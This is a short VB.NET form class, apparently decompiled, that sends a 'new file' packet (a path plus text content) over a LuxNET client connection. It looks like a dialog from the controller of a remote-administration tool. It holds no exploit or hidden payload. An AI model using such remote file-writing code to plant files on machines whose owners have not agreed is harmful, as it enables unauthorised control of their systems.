Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class NewFile
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.InitializeComponent()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.SendPacket(New Object() {CByte(14), (Me.path & Me.TextBox1.Text), Me.RichTextBox1.Text})
        Me.Close()
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
    End Sub

    Public client As ServerClient
    Private packer As LuxNET.Pack
    Public path As String

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        NewFile = 14
    End Enum
End Class